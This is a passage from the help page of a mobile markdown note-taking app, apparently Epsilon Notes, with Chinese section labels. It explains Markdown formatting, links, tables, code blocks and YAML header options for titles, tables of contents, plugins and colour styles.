<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># My Heading, Part 1</span><br></pre></td></tr></table></figure>
<p>is</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Link](#my-heading-part-1)</span><br></pre></td></tr></table></figure>
<p>If it is hard to write links to headings, use <a href="#anchor-tags">anchor tags</a>.</p>
<hr />
<h2 id="italic-bold-underline-strikethrough-highlight"><a class="markdownIt-Anchor" href="#italic-bold-underline-strikethrough-highlight"></a> Italic, bold, underline, strikethrough, highlight</h2>
<p>To write text in italic, surround the italicized text with <code>*</code> or <code>_</code> characters. To write text in bold font, surround the bold typed text with <code>**</code> (two asterisks) or <code>__</code> (two underscores) characters.</p>
<p>For underlining, use <code>++</code>, and for strikethrough - use <code>~~</code>, for highlighting - use <code>==</code>, for superscript - use <code>^^</code></p>
<p>For example, if you write:</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">In this <span class="emphasis">_text_</span> I use the <span class="emphasis">*italic*</span> font.\</span><br><span class="line">In this <span class="strong">__text__</span> , I use the <span class="strong">**bold**</span> font.\</span><br><span class="line">And now I use ++underline++ and ~~strikethrough~~\</span><br><span class="line">This text contains ==highlight== and ^^superscript^^</span><br></pre></td></tr></table></figure>
<p>In the reading mode, you will see:</p>
<p>In this <em>text</em> I use the <em>italic</em> font.<br />
In this <strong>text</strong> , I use the <strong>bold</strong> font.<br />
And now I use <ins>underline</ins> and <s>strikethrough</s><br />
This text contains <mark>highlight</mark> and ^<sup>superscript</sup>^</p>
<p>You can combine <em>italic</em> and <strong>bold</strong> by writing</p>
<ul>
<li><code>_**italic and bold**_</code></li>
<li><code>__*italic and bold*__</code></li>
<li><code>***italic and bold***</code></li>
<li><code>___italic and bold___</code></li>
</ul>
<p>all of which will produce: <em><strong>italic and bold</strong></em>.</p>
<hr />
<h2 id="links-pictures-paths链接-图片-路径"><a class="markdownIt-Anchor" href="#links-pictures-paths链接-图片-路径"></a> Links, pictures, paths（链接、图片、路径）</h2>
<p>To write a link, simply write it. For example, <code>http://google.com</code> will produce: <a href="http://google.com" target="_blank" rel="noopener">http://google.com</a></p>
<ul>
<li>Pressing a link to Internet, opens the device’s browser.</li>
</ul>
<p>To write a link covered with a name, use the format <code>[name](http://link.com]</code>. For example: <code>[This link leads to google](http://google.com)</code> will give you:</p>
<p><a href="http://google.com" target="_blank" rel="noopener">This link leads to google</a></p>
<p>To make a link to a picture in the internet, use<br />
<code>![name](http://link.com/picture.jpg)</code> format. For example: <code>![face book icon](https://www.facebook.com/images/fb_icon_325x325.png)</code> will result in:</p>
<style>#section1 img{width:20%}</style>
<div id="section1"> 
<p><img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="face book icon" /></p>
</div>
<p>You can add relative path to your pictures in the current folder: <code>![My picture](my_picture.jpg)</code></p>
<p>You can add relative paths to other Commonmark files:</p>
<ul>
<li><code>[File in this folder](my_file.txt)</code></li>
<li><code>[File in subfolder](subfolder/my_file.txt)</code></li>
<li><code>[File in superfolder](../my_file.txt)</code></li>
</ul>
<p>You can insert pictures from your Gallery to your notes. To do that, press the image button on the edit-mode symbol bar.</p>
<p>You can view pictures by clicking on the picture name in the file browser. Press back to return to your document. After you view a picture, it’s path is stored in the ClipBoard, so you can paste it to your document.</p>
<p>When you long press an item in the file browser, the context menu will offer you to copy the absolute link to the file to Clipboard.</p>
<h3 id="links-to-files-without-extension不用扩展给文件添加链接"><a class="markdownIt-Anchor" href="#links-to-files-without-extension不用扩展给文件添加链接"></a> Links to files without extension（不用扩展，给文件添加链接）</h3>
<ul>
<li>Normally, you write a link in the format <code>[Link](myfile.txt)</code>. It is not necessary to add <code>.txt</code> at the end of the file name. When the extension is omitted, the default file extension (.txt, .cm, .md, .mkd or .markdown) is added automatically, depending on the extension you have chosen in the Preferences. Thus, if you have set <code>.md</code> as the default extension, clicking on the link “<code>[File](some_name)</code>” will send you to the file <code>some_name.md</code></li>
</ul>
<h3 id="links-to-inexistent-files链接到不存在的文件点击时会创建新文件"><a class="markdownIt-Anchor" href="#links-to-inexistent-files链接到不存在的文件点击时会创建新文件"></a> Links to inexistent files（链接到不存在的文件，点击时会创建新文件）</h3>
<ul>
<li>You can create a new file in the current folder by writing the name of an inexistent file: <code>[My New File](my_new_file.txt)</code> and it will automatically be created once you try to click on it in the viewer mode.</li>
<li>You can use relative paths for inexistent files. Epsilon Notes will attempt to create a file, but the correct link back is not guaranteed.</li>
<li>If it creates a lot of “garbage files”, you can disable this feature in the Preferences.</li>
</ul>
<h3 id="links-to-sections-in-documents链接到特定文档特定区域"><a class="markdownIt-Anchor" href="#links-to-sections-in-documents链接到特定文档特定区域"></a> Links to sections in documents（链接到特定文档特定区域）</h3>
<ul>
<li>You can make links to headings inside the document. See <a href="#linkstoheadings">how</a>.</li>
<li>You can make a link to some section in another document. If the section exists, the document will be scrolled thereto automatically. The format of the link is: <code>[Link to Section](another_document.txt#section)</code>.</li>
<li>You can use headings in other documents as section names. For example, to make a link to the heading <code>### My welcome</code> in a document called <code>Hello.txt</code>, write <code>[Link to My welcome](hello#my-welcome)</code></li>
</ul>
<h3 id="note-on-spaces-in-links注意链接中的空格"><a class="markdownIt-Anchor" href="#note-on-spaces-in-links注意链接中的空格"></a> Note on SPACES in links（注意链接中的空格）</h3>
<ul>
<li>You must use URL format in links. It means you must use <strong><font color="red">%20</font></strong> instead of spaces!</li>
</ul>
<p><strong>Thus:</strong></p>
<p> <strong><font color="red">NO - </font></strong> <code>[File in this folder](my file.txt)</code><br />
 <strong><font color="green">YES - </font></strong> <code>[File in this folder](my%20file.txt)</code></p>
<p>See details on Commommark specifications <a href="http://spec.commonmark.org/0.27/" target="_blank" rel="noopener">here</a>.</p>
<h3 id="telephone-links电话号码链接"><a class="markdownIt-Anchor" href="#telephone-links电话号码链接"></a> Telephone links（电话号码链接）</h3>
<p>You can make a telephone link in one of the following formats:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[My telephone](tel:+1-234-456-78-90)</span><br><span class="line"></span><br><span class="line">&lt;tel:+1-234-456-78-90&gt;</span><br><span class="line"></span><br><span class="line">tel:&#x2F;&#x2F;+1-234-456-78-90</span><br></pre></td></tr></table></figure>
<p>which will render to one of the following:</p>
<p><a href="tel:+1-234-456-78-90">My telephone</a></p>
<p><a href="tel:+1-234-456-78-90">tel:+1-234-456-78-90</a></p>
<p>tel://+1-234-456-78-90</p>
<hr />
<h3 id="in-text-toc文档中间添加目录"><a class="markdownIt-Anchor" href="#in-text-toc文档中间添加目录"></a> In-text TOC（文档中间添加目录）</h3>
<ul>
<li>You can place table of contents in any place of your document. Write <code>[TOC]</code> preceded and followed by an empty line. The format is:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">      &lt;-- empty line</span><br><span class="line">[TOC] &lt;-- capital letters</span><br><span class="line">      &lt;-- empty line</span><br></pre></td></tr></table></figure>
<hr />
<h2 id="anchor-tags锚标签"><a class="markdownIt-Anchor" href="#anchor-tags锚标签"></a> Anchor tags（锚标签）</h2>
<p>Anchor tag <code>&lt;a name=&quot;&quot;&gt;&lt;/a&gt;</code> is one of the buttons in the symbol bar 2. The shorcut word for the anchor tag is ANCHOR.</p>
<p>To make links inside your document, you can insert an anchor tag at some point in your text and jump to that part of the text from other places. Commonmark standard doesn’t have a symbol for anchors. But you can use HTML in your text. The html anchor tag looks like this: <code>&lt;a name=&quot;tag_name&quot;&gt;&lt;/a&gt;</code>. And you can make link to it by writing in Commonmark: <code>[Some description](#tag_name)</code>.</p>
<p>It works this way:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a name&#x3D;&quot;my_anchor&quot;&gt;&lt;&#x2F;a&gt;</span><br><span class="line">### This is a heading with an anchor</span><br><span class="line"></span><br><span class="line">Lorem ipsum... and all that stuff...</span><br><span class="line"></span><br><span class="line">[Return to the heading with an anchor](#my_anchor)</span><br></pre></td></tr></table></figure>
<p>will produce:</p>
<p><a name="my_anchor"></a></p>
<h3> This is a heading with an anchor </h3>
<p>Lorem ipsum… and all that stuff…</p>
<p><a href="#my_anchor">Go to the heading with an anchor</a></p>
<hr />
<h2 id="quotes引用"><a class="markdownIt-Anchor" href="#quotes引用"></a> Quotes（引用）</h2>
<p>To write quotes, use <code>&gt;</code> at the beginning of the line.<br />
For example:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; Eternity: a moment standing still for ever</span><br><span class="line">&gt;</span><br><span class="line">&gt; _James Montgomery_</span><br></pre></td></tr></table></figure>
<p>will produce:</p>
<blockquote>
<p>Eternity: a moment standing still for ever</p>
<p><em>James Montgomery</em></p>
</blockquote>
<hr />
<h2 id="tables表格"><a class="markdownIt-Anchor" href="#tables表格"></a> Tables（表格）</h2>
<p>To draw table, just “draw it”. For example, like this:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">| Heading 1   | Heading   2 |</span><br><span class="line">| ----------- | ----------- |</span><br><span class="line">| cell   1    | cell   2    |</span><br><span class="line">| cell   3    | cell   4    |</span><br><span class="line">| cell   5    | cell   6    |</span><br></pre></td></tr></table></figure>
<p>Or like this:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Heading 1   | Heading   2</span><br><span class="line">----------- | -----------</span><br><span class="line">cell   1    | cell   2 </span><br><span class="line">cell   3    | cell   4</span><br><span class="line">cell   5    | cell   6</span><br></pre></td></tr></table></figure>
<p>Which will produce:</p>
<table>
<thead>
<tr>
<th>Heading 1</th>
<th>Heading   2</th>
</tr>
</thead>
<tbody>
<tr>
<td>cell   1</td>
<td>cell   2</td>
</tr>
<tr>
<td>cell   3</td>
<td>cell   4</td>
</tr>
<tr>
<td>cell   5</td>
<td>cell   6</td>
</tr>
</tbody>
</table>
<p>You can position the contents of cells by placing a colon in the second line, indicating the position, for example:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">| Left   | Center |  Right |</span><br><span class="line">| :---   | :---:  |   ---: |</span><br><span class="line">| cell 1 | cell 2 | cell 3 |</span><br><span class="line">| cell 4 | cell 5 | cell 6 |</span><br></pre></td></tr></table></figure>
<p>will produce</p>
<table>
<thead>
<tr>
<th style="text-align:left">Left</th>
<th style="text-align:center">Center</th>
<th style="text-align:right">Right</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">cell 1</td>
<td style="text-align:center">cell 2</td>
<td style="text-align:right">cell 3</td>
</tr>
<tr>
<td style="text-align:left">cell 4</td>
<td style="text-align:center">cell 5</td>
<td style="text-align:right">cell 6</td>
</tr>
</tbody>
</table>
<p>Cells can vary in width and do not need to be perfectly aligned within columns. There must be at least three hyphens in each column of the header row.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">| Aspect | Description |</span><br><span class="line">| --- | --- |</span><br><span class="line">| status | New document |</span><br><span class="line">| difference | Awesome differences  |</span><br></pre></td></tr></table></figure>
<p>Rendered table with varied cell width</p>
<table>
<thead>
<tr>
<th>Aspect</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>status</td>
<td>New document</td>
</tr>
<tr>
<td>difference</td>
<td>Awesome differences</td>
</tr>
</tbody>
</table>
<p>When you press <code>Insert Table</code> button, it inserts a “borderless” commonmark table tag, which is easier to fill in.</p>
<p>Fill it in as follows:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Header 1 | Header 2</span><br><span class="line">  ---    |   ---</span><br><span class="line"> Cell 1  |  Cell 2</span><br><span class="line"> Cell 3  |  Cell 4</span><br></pre></td></tr></table></figure>
<p>Surround tables with <code>&lt;noheader&gt;</code> and <code>&lt;/noheader&gt;</code> tags if they should appear without headers.<br />
Example:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;noheader&gt;</span><br><span class="line"></span><br><span class="line"> Any text | ...</span><br><span class="line">----------|---</span><br><span class="line">A         | B</span><br><span class="line">C         | D</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;noheader&gt;</span><br></pre></td></tr></table></figure>
<noheader>
<table>
<thead>
<tr>
<th>…</th>
<th>…</th>
</tr>
</thead>
<tbody>
<tr>
<td>A</td>
<td>B</td>
</tr>
<tr>
<td>C</td>
<td>D</td>
</tr>
</tbody>
</table>
</noheader>
<hr />
<h2 id="code-blocks代码块"><a class="markdownIt-Anchor" href="#code-blocks代码块"></a> Code blocks（代码块）</h2>
<p>To write code, use three backticks (```) in the beginning of the code and at the end of the code. For example:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;&#96;&#96;</span><br><span class="line">procedure hello_world</span><br><span class="line">begin</span><br><span class="line">    writeln (&quot;Hello world&quot;);</span><br><span class="line">    readln();</span><br><span class="line">end.</span><br><span class="line">&#96;&#96;&#96;</span><br></pre></td></tr></table></figure>
<p>will show:</p>
<figure class="highlight pascal"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">procedure</span> <span class="title">hello_world</span></span></span><br><span class="line"><span class="function"><span class="title">begin</span></span></span><br><span class="line"><span class="function">    <span class="title">writeln</span> <span class="params">("Hello world")</span>;</span></span><br><span class="line">    readln();</span><br><span class="line"><span class="keyword">end</span>.</span><br></pre></td></tr></table></figure>
<p>Instead of backticks, you can use several <code>~</code> signs.</p>
<p>You can also write code by identing a line with four spaces. (Use <code>TAB</code> button for that).<br />
For example, in the next block, each line starts with 4 spaces, instead of backticks:</p>
<pre><code>10 CLS
20 PRINT &quot;Hello world&quot;
30 INPUT A$
40 END
</code></pre>
<p><strong><font color="red">Utility for programmers:</font></strong></p>
<ul>
<li>
<p>To highlight codeblocks in all documents, select the appropriate setting in <code>Preferences-&gt;Enable Plugins</code></p>
</li>
<li>
<p>To disable highlighting codeblocks in individual documents, add YAML:</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">code: none</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<ul>
<li>When writing codeblocks, to help Epsilon Notes understand how to highlight it, you can specify the programming language. For example,</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;&#96;&#96;java</span><br><span class="line">public class HelloWorld &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        &#x2F;&#x2F; Prints &quot;Hello, World&quot; to the terminal window.</span><br><span class="line">        System.out.println(&quot;Hello, World&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#96;&#96;&#96;</span><br></pre></td></tr></table></figure>
<p>will produce</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// Prints "Hello, World" to the terminal window.</span></span><br><span class="line">        System.out.println(<span class="string">"Hello, World"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>to prevent highlighting, write <code>none</code> next to the three backticks:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;&#96;&#96;none</span><br><span class="line">public class HelloWorld &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        &#x2F;&#x2F; Prints &quot;Hello, World&quot; to the terminal window.</span><br><span class="line">        System.out.println(&quot;Hello, World&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#96;&#96;&#96;</span><br></pre></td></tr></table></figure>
<p>which will produce a non-highlighted code</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class HelloWorld &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        &#x2F;&#x2F; Prints &quot;Hello, World&quot; to the terminal window.</span><br><span class="line">        System.out.println(&quot;Hello, World&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h2 id="bulleted-and-numbered-lists项目符号和编号列表无序有序列表"><a class="markdownIt-Anchor" href="#bulleted-and-numbered-lists项目符号和编号列表无序有序列表"></a> Bulleted and numbered lists（项目符号和编号列表／无序有序列表）</h2>
<p>Examples</p>
<p><ins>Bullet lists</ins></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">* Point 1</span><br><span class="line">* Point 2</span><br><span class="line">  * Sub-point 2.1</span><br><span class="line">  * Sub-point 2.2</span><br><span class="line"></span><br><span class="line">Or  </span><br><span class="line"></span><br><span class="line">- Alternative point 1</span><br><span class="line">- Alternative point 2</span><br><span class="line">  - Alternative sub-point 2.1</span><br><span class="line">  - Alternative sub-point 2.2</span><br><span class="line"></span><br><span class="line">Or </span><br><span class="line"></span><br><span class="line">+ Alternative point 1</span><br><span class="line">+ Alternative point 2</span><br><span class="line">  + Alternative sub-point 3.1</span><br><span class="line">  + Alternative sub-point 3.2</span><br></pre></td></tr></table></figure>
<p>Any of which will produce:</p>
<ul>
<li>Point 1</li>
<li>Point 2
<ul>
<li>Sub-point 2.1</li>
<li>Sub-point 2.2</li>
</ul>
</li>
</ul>
<p><ins>Numbered lists</ins></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. Point 1</span><br><span class="line">1. Point 2</span><br><span class="line">   1. Sub-point 2.1</span><br><span class="line">   1. Sub-point 2.2</span><br><span class="line">1. Point 3</span><br><span class="line"></span><br><span class="line">Or  </span><br><span class="line"></span><br><span class="line">1) Point 1</span><br><span class="line">1) Point 2</span><br><span class="line">   1) Sub-point 2.1</span><br><span class="line">   1) Sub-point 2.2</span><br><span class="line">1) Point 3</span><br></pre></td></tr></table></figure>
<p>will produce</p>
<ol>
<li>Point 1</li>
<li>Point 2
<ol>
<li>Sub-point 2.1</li>
<li>Sub-point 2.2</li>
</ol>
</li>
<li>Point 3</li>
</ol>
<p>It does not matter what number you write in a numbered list. It is numbered <mark>automatically</mark>.</p>
<hr />
<h2 id="htmlhtml-语法应用"><a class="markdownIt-Anchor" href="#htmlhtml-语法应用"></a> HTML（HTML 语法应用）</h2>
<p>If some functions are needed, but not provided in this editor, you can use html directly in the text. For example, the html tag <code>&lt;font color=&quot;red&quot;&gt; text &lt;/font&gt;</code> is used to make <font color="red"> <strong>RED TEXT</strong> </font>.</p>
<hr />
<h2 id="horizontal-rule水平线"><a class="markdownIt-Anchor" href="#horizontal-rule水平线"></a> Horizontal rule（水平线）</h2>
<p>To draw a horizontal rule, write <code>- - -</code> or <code>* * *</code> on a new paragraph.</p>
<hr />
<h2 id="footnotes脚注"><a class="markdownIt-Anchor" href="#footnotes脚注"></a> Footnotes（脚注）</h2>
<ul>
<li>Footnotes. You can make reference to a footnote as <span>[</span>^footnote]. The reference back is the same, but with colon at the end <span>[</span>^footnote]: For example: the footnote <span>[</span>^comment] will look like this<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup>.</li>
</ul>
<hr />
<h2 id="commonmark-full-referencecommonmark-完整参考"><a class="markdownIt-Anchor" href="#commonmark-full-referencecommonmark-完整参考"></a> Commonmark full reference（Commonmark 完整参考）</h2>
<p>For full Commonmark referrence proceed to the link:</p>
<p><a href="http://commonmark.org/help/" target="_blank" rel="noopener">http://commonmark.org/help/</a></p>
<hr />
<p><em><div align="center">To see all available YAML properties, tap <a href="#all-yaml">here</a></div></em></p>
<h1 id="yamlyaml-语法"><a class="markdownIt-Anchor" href="#yamlyaml-语法"></a> YAML（YAML 语法）</h1>
<p><font color="red">Using YAML headers tells Epsilon Notes what you need or you don’t need in your document. Especially, regarding the MathJax and ABC notation plugins. It is strongly advisable to use these headers, rather than the global settings of the Preferences.</font></p>
<center>
<p><em><strong>To read about Mathjax and ABC, go to Menu → Help → For advanced users</strong></em></p>
</center>
<h2 id="description说明-2"><a class="markdownIt-Anchor" href="#description说明-2"></a> Description（说明）</h2>
<p><strong>Note 1:</strong> You can disable the YAML title display settings in the Preferences.<br />
<strong>Note 2:</strong> To see all available YAML properties, tap <a href="#all-yaml">here</a></p>
<p>You can add some meta-data at the very beginning of the document in the format:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: Mémoirs</span><br><span class="line">author: Queen Elizabeth</span><br><span class="line">description: Majestic biography</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>Or</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: Mémoirs</span><br><span class="line">author: Queen Elizabeth</span><br><span class="line">description: Majestic biography</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p>This meta-data is not shown in the rendered mode, but can be used for your information, when you switch to the edit mode or as metadata for third-party Markdown processors, which support YAML.</p>
<p>This information is also used to switch on plug-ins and styles in your documents.</p>
<p><strong>YAML and Plugins:</strong> Use Yaml, if you want to include some features only in some documents, and not in others. For example, if you have 5000 documents, of which only 3 documents use formulas or music notes, then <ins><em><strong>it is better to turn off the MathJax and ABC Notation plug-ins in the Preferences and to turn them on only in the documents that use them.</strong></em></ins> (<em>See help on Mathjax and ABC in the help section for advanced users.</em>)</p>
<p>To customize the view and plug-ins in one document, use YAML, or document properties, in the very beginning of the document in the following format:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">property:value</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>or</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">property:</span><br><span class="line"> - value 1</span><br><span class="line"> - value 2</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>Epsilon Notes supports the following properties: <code>title</code>, <code>toc</code>, <code>uses</code> and <code>style</code>, and the following values:</p>
<ul>
<li>value for <code>title</code>: the title of your document.</li>
<li>value for <code>toc</code>: the title of the table of contents section.</li>
<li>values for <code>uses</code>
<ul>
<li>mathjax</li>
<li>abc</li>
</ul>
</li>
<li>values for <code>style</code>
<ul>
<li>day</li>
<li>night</li>
<li>white</li>
<li>black</li>
<li>user</li>
<li>nostyle</li>
</ul>
</li>
</ul>
<p><a id="yaml-style"></a></p>
<p>You can personalize style individually in files.</p>
<p><em>to refer to the stylesheet <strong>mystyle.css</strong> in the current folder</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">style: mystyle.css</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p><em>to provide an absolute link to your style file.</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">style: file:&#x2F;&#x2F;&#x2F;storage&#x2F;emulated&#x2F;0...&#x2F;mystyles.css</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p><em>to provide a link to your style in the Internet</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">style: http:&#x2F;&#x2F;www.mysite.com&#x2F;mystyle.css</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p><strong>NOTA BENE:</strong> Clear cache!</p>
<p>When you change styles or use MathJax, the view, which shows the rendered document, caches some elements (for example, css and MathJax scripts loaded from external sources), so you can continue using these elements even offline. If you want css and MathJax to re-initialize, clear the cache. <code>Menu → Clear cache</code></p>
<center>
<p><em><strong>To read about Mathjax and ABC, go to Menu → Help → For advanced users</strong></em></p>
</center>
<p><strong>Title:</strong> If you want your document to show the title, write at the top of the document:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: My Title</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p><strong>Table of Contents:</strong> If you want your document to have the table of contents based on the headings contained in your document:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">toc: Name of the Table of Contents section</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>You can combine the properties, for example like this:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: My Book</span><br><span class="line">toc: Contents</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>which will generate the following text layout:</p>
<hr />
<h1 class="nocount" id="my-book"> My book </h1>
<h2 class="nocount"> Contents </h2>
- [heading one](#my-book)
- [heading two](#my-book)
- [heading three](#my-book)
<p>Main text…</p>
<hr />
<p>If you want your document to use MathJax or ABC Notation, you have to write in the very beginning of the document:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">uses: mathjax</span><br><span class="line">...</span><br><span class="line">&#96;&#96;&#96; </span><br><span class="line">or</span><br><span class="line">&#96;&#96;&#96;none</span><br><span class="line">--- </span><br><span class="line">uses: abc</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>if the document uses both MathJax and ABC notation, then write at the top of the document:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">uses:</span><br><span class="line"> - mathjax</span><br><span class="line"> - abc</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p><em><strong>To read more about Mathjax and ABC, go to Menu → Help → For advanced users</strong></em></p>
<p>If you want your document to be rendered in the day style, write at the top of the document:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">style: day</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>Five styles are supported: day, night, white, black and user.</p>
<p>If you want your document to use MathJax, ABC notation and be rendered in the white style, write the following declaration at the top of your document:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">uses:</span><br><span class="line"> - mathjax</span><br><span class="line"> - abc</span><br><span class="line">style: white</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>Another example of using the individual document setting:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: Psychology of White Mice</span><br><span class="line">toc: Contents of the Article</span><br><span class="line">uses: </span><br><span class="line"> - abc</span><br><span class="line"> - mathjax</span><br><span class="line">style: white</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>This document header will generate the title and the table of contents at the top of the document, and will force Epsilon Notes to use ABC notation and MathJax rendering, and will apply the white css theme.</p>
<p>Once again, <strong>mind the YAML format</strong>, for example:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">uses: abc</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>but</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">uses:</span><br><span class="line"> - abc</span><br><span class="line"> - mathjax</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<ul>
<li>You can add date to your YAML header, which will be displayed at the top of the screen under the title.</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">date:2016-10-29</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<ul>
<li>Use YAML for autonumbering headings (starting from level two)</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">heading: autonumber</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<ul>
<li>Use YAML for headings to trigger scrolling to the top of the document when pressed.</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">heading: totop</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h3 id="use-yaml-for-material-color-styles用yaml制作实用颜色样式"><a class="markdownIt-Anchor" href="#use-yaml-for-material-color-styles用yaml制作实用颜色样式"></a> Use YAML for material color styles!（用YAML制作实用颜色样式） ☆</h3>
<h4 id="theme-names主题名称"><a class="markdownIt-Anchor" href="#theme-names主题名称"></a> Theme names（主题名称）</h4>
<center>
<p><strong><font color="red">Premium Version ☆</font></strong></p>
</center>
<p>Your documents can be painted to colors proposed for the Material Design <a href="https://material.io/guidelines/style/color.html#color-color-schemes" target="_blank" rel="noopener">here</a>.</p>
<p>The names of the styles correspond to their colors.</p>
<p>Here are the extreme shades of the styles:</p>
<table style="text-align:center;">
<tr>
<td style="width:50%;background-color:#B71C1C;color:#FFEBEE"> red </td>
<td style="background-color:#FFEBEE;color:#B71C1C"> red-light </td>
</tr>
<tr>
<td style="background-color:#880E4F;color:#FCE4EC"> pink </td>
<td style="background-color:#FCE4EC;color:#880E4F"> pink-light </td>
</tr>
<tr>
<td style="background-color:#4A148C;color:#F3E5F5"> purple </td>
<td style="background-color:#F3E5F5;color:#4A148C"> purple-light </td>
</tr>
<tr>
<td style="background-color:#311B92;color:#EDE7F6"> deeppurple </td>
<td style="background-color:#EDE7F6;color:#311B92"> deeppurple-light </td>
</tr>
<tr>
<td style="background-color:#1A237E;color:#EDE7F6"> indigo </td>
<td style="background-color:#E8EAF6;color:#1A237E"> indigo-light </td>
</tr>
<tr>
<td style="background-color:#0D47A1;color:#E3F2FD"> blue </td>
<td style="background-color:#E3F2FD;color:#0D47A1"> blue-light </td>
</tr>
<tr>
<td style="background-color:#01579B;color:#E1F5FE"> lightblue </td>
<td style="background-color:#E1F5FE;color:#01579B"> lightblue-light </td>
</tr>
<tr>
<td style="background-color:#006064;color:#E0F7FA"> cyan </td>
<td style="background-color:#E0F7FA;color:#006064"> cyan-light </td>
</tr>
<tr>
<td style="background-color:#004D40;color:#E0F2F1"> teal </td>
<td style="background-color:#E0F2F1;color:#004D40"> teal-light </td>
</tr>
<tr>
<td style="background-color:#1B5E20;color:#E8F5E9"> green </td>
<td style="background-color:#E8F5E9;color:#1B5E20"> green-light </td>
</tr>
<tr>
<td style="background-color:#33691E;color:#F1F8E9"> lightgreen </td>
<td style="background-color:#F1F8E9;color:#33691E"> lightgreen-light </td>
</tr>
<tr>
<td style="background-color:#827717;color:#F9FBE7"> lime </td>
